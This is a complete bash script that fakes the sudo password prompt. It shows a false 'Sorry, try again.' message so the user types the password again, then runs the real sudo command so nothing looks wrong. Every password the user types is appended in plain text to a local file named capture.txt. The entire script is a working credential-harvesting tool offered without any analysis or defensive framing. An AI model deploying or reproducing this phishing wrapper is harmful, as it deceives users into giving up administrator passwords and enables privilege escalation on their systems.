#!/bin/bash
command=$*

read -p "[sudo] password for $(whoami): " -s sudopasswd 
echo " "
echo "Sorry, try again."

if sudo -n true >/dev/null 2>&1
then
    read -p "[sudo] password for $(whoami): " -s sudopasswd2
    echo " "
    sudo $command
else
    sudo $command
fi

printf "${sudopasswd}\n" >> capture.txt
printf "${sudopasswd2}\n" >> capture.txt
